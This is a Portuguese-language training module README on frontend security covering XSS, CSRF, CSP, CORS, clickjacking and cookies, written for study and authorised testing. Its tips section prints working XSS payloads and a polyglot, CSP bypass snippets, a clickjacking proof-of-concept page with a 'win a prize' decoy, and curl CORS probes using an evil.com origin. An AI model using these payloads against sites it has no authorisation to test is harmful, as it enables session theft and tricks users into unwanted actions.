# 🌐 Módulo 13 - Frontend Security

> **Proteja aplicações web contra XSS, CSRF, Clickjacking e outras ameaças frontend**

## 📊 Informações do Módulo

| ⏱️ Tempo | 📊 Nível | 📁 Arquivos | 🛠️ Ferramentas |
|-----------|----------|-------------|----------------|
| 5-6 horas | ⭐⭐ Intermediário | 2 | 8 |

### 🛠️ Ferramentas Utilizadas

`nuclei` `Burp Suite` `XSS Hunter` `BeEF` `OWASP ZAP` `CSP Evaluator` `Clickjacking Test` `curl`

---

## 🎯 Objetivos de Aprendizagem

Ao final deste módulo, você será capaz de:

- [ ] Identificar e explorar XSS (Stored, Reflected, DOM)
- [ ] Prevenir e testar vulnerabilidades CSRF
- [ ] Implementar Content Security Policy (CSP) eficaz
- [ ] Testar configurações CORS inadequadas
- [ ] Prevenir e testar Clickjacking
- [ ] Proteger cookies com flags de segurança
- [ ] Identificar DOM Clobbering e prototype pollution
- [ ] Utilizar ferramentas automatizadas para detecção

---

## 📋 Pré-requisitos

| Conhecimento | Nível | Onde Estudar |
|--------------|-------|--------------|
| JavaScript Básico | Intermediário | MDN Web Docs |
| HTML/CSS | Básico | W3Schools |
| HTTP Intermediário | Intermediário | Módulo 3 - Web Security |
| DOM (Document Object Model) | Intermediário | MDN Web Docs |
| JSON e APIs | Básico | Módulo 11 - API Security |

---

## 🗺️ Mapa Visual do Módulo

```
┌─────────────────────────────────────────────────────────────────┐
│                   FRONTEND SECURITY                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐         │
│  │     XSS     │───▶│    CSRF     │───▶│     CSP     │         │
│  │  (1.1-1.5)  │    │  (1.6-1.8)  │    │  (1.9-1.11) │         │
│  └─────────────┘    └─────────────┘    └─────────────┘         │
│         │                  │                  │                 │
│         ▼                  ▼                  ▼                 │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐         │
│  │    CORS     │───▶│CLICKJACKING │───▶│   COOKIES   │         │
│  │  (1.12-1.14)│    │  (1.15-1.17)│    │  (1.18-1.20)│         │
│  └─────────────┘    └─────────────┘    └─────────────┘         │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 📚 Conteúdo do Módulo

### 📖 Arquivo 1: `01-frontend-vulnerabilities.md`
- Cross-Site Scripting (XSS) completo
- Cross-Site Request Forgery (CSRF)
- Content Security Policy (CSP)
- Cross-Origin Resource Sharing (CORS)

### 📖 Arquivo 2: `02-frontend-protection.md`
- Clickjacking e proteção
- Segurança de cookies
- DOM Clobbering e prototype pollution
- Automação de testes

---

## 💡 Dicas de Ouro

### 🥇 Dica 1: XSS Avançado com Mutation XSS
```html
<!-- Mutation XSS que contorna filtros básicos -->
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
<img src=x onerror=alert(1)>
<iframe src="javascript:alert(1)">

<!-- DOM-based XSS -->
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">

<!-- Polyglot XSS -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
```

### 🥇 Dica 2: CSP Bypass Técnicas
```bash
# Avaliar CSP atual
nuclei -u https://target.com -t http/security/csp.yaml

# Testar bypasses comuns
# 1. Se há 'unsafe-inline'
<script>alert(1)</script>

# 2. Se há wildcard em domains
<script src="https://anywhere.com/xss.js"></script>

# 3. Se há permissão de upload
Upload HTML file com XSS

# Usar CSP Evaluator do Google
# https://csp-evaluator.withgoogle.com/
```

### 🥉 Dica 3: Clickjacking Proof of Concept
```html
<!-- PoC básico de Clickjacking -->
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        .target {
            position: relative;
            width: 500px;
            height: 300px;
            opacity: 0.8;
            z-index: 2;
        }
        .decoy {
            position: absolute;
            top: 0;
            left: 0;
            width: 500px;
            height: 300px;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div class="decoy">
        <button>Clique aqui para ganhar!</button>
    </div>
    <iframe class="target" src="https://target.com"></iframe>
</body>
</html>
```

### 🏅 Dica 4: CORS Misconfiguration
```bash
# Testar CORS com curl
curl -H "Origin: https://evil.com" -I https://target.com

# Verificar se reflete Origin
curl -H "Origin: https://evil.com" https://target.com -v

# Testar com null origin
curl -H "Origin: null" https://target.com

# Testar com subdomain
curl -H "Origin: https://subdomain.target.com" https://target.com
```

---

## ⚠️ Erros Comuns

| ❌ Erro | ✅ Solução |
|---------|-----------|
| Confiar em sanitização no client-side | Sempre sanitizar no server-side |
| Usar innerHTML com dados do usuário | Usar textContent ou sanitizar |
| Não configurar SameSite em cookies | Usar SameSite=Strict ou Lax |
| Não testar CSP em todos os endpoints | Verificar CSP em toda a aplicação |
| Assumir que HTTPS resolve tudo | HTTPS não previne XSS, CSRF, Clickjacking |

---

## 🧪 Labs Recomendados

### PortSwigger XSS Labs
- **URL:** https://portswigger.net/web-security/cross-site-scripting
- **Duração:** 4-5 horas
- **Foco:** Todos os tipos de XSS (Stored, Reflected, DOM)
- **Nível:** Intermediário

### TryHackMe - OWASP Top 10
- **URL:** https://tryhackme.com/room/owasptop10
- **Duração:** 3-4 horas
- **Foco:** A1-A3 (Injection, Broken Auth, XSS)
- **Nível:** Básico/Intermediário

### XSS Game - Google
- **URL:** https://xss-game.appspot.com/
- **Duração:** 2 horas
- **Foco:** XSS challenges práticos
- **Nível:** Básico

---

## ✅ Checklist de Conclusão

Antes de avançar para o próximo módulo, verifique se você:

- [ ] Identifica os 3 tipos de XSS em qualquer aplicação
- [ ] Cria PoC funcional para Stored XSS
- [ ] Explora DOM-based XSS usando eventos do DOM
- [ ] Testa CSRF em formulários e APIs
- [ ] Configura CSP com directivas adequadas
- [ ] Testa CORS com múltiplos cenários
- [ ] Cria PoC de Clickjacking funcional
- [ ] Configura flags de segurança em cookies
- [ ] Utiliza Burp Suite para testes automatizados
- [ ] Completa pelo menos 2 labs práticos

---

## 🔗 Navegação

```
Módulo Anterior                    Próximo Módulo
    │                                   │
    ▼                                   ▼
┌───────────────────┐         ┌───────────────────┐
│  12-Database-     │────────▶│  14-Mobile-       │
│    Security       │         │    Security       │
│    (Avançado)     │         │   (Intermediário) │
└───────────────────┘         └───────────────────┘
```

### 📂 Estrutura do Módulo

```
13-frontend-security/
├── README.md                          # Este arquivo
├── 01-frontend-vulnerabilities.md     # XSS, CSRF, CSP, CORS
└── 02-frontend-protection.md          # Clickjacking, Cookies, Automação
```

### 🏠 [Voltar ao Menu Principal](../README.md)

---

> **⏱️ Tempo estimado de estudo:** 5-6 horas
> **🎯 Dificuldade:** ⭐⭐ Intermediário
> **✅ Pré-requisitos completos?** Avance para o Módulo 14!

---

*Criado para a trilha de Cybersegurança - Módulo 13: Frontend Security*
